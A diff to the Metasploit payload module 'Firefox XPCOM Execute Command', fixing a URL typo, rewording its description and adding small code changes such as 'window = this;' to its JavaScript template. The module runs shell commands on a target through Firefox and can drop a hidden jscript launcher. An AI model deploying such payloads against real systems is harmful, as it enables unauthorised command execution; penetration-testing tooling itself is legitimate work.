@@ -1,24 +1,24 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
-require 'msf/core/payload/firefox'
 
 module Metasploit3
+
+  CachedSize = :dynamic
 
   include Msf::Payload::Single
   include Msf::Payload::Firefox
 
   def initialize(info={})
     super(merge_info(info,
-      'Name'          => 'Firefox XPCOM execute command',
+      'Name'          => 'Firefox XPCOM Execute Command',
       'Description'   => %Q|
-        Runs a shell command on the OS. Never touches the disk.
-
+        This module runs a shell command on the target OS withough touching the disk.
         On Windows, this command will flash the command prompt momentarily.
-        You can avoid this by setting WSCRIPT to true, which drops a jscript
+        This can be avoided by setting WSCRIPT to true, which drops a jscript
         "launcher" to disk that hides the prompt.
       |,
       'Author'        => ['joev'],
@@ -36,6 +36,7 @@ module Metasploit3
     <<-EOS
 
       (function(){
+        window = this;
         #{read_file_source if datastore['WSCRIPT']}
         #{run_cmd_source if datastore['WSCRIPT']}
 
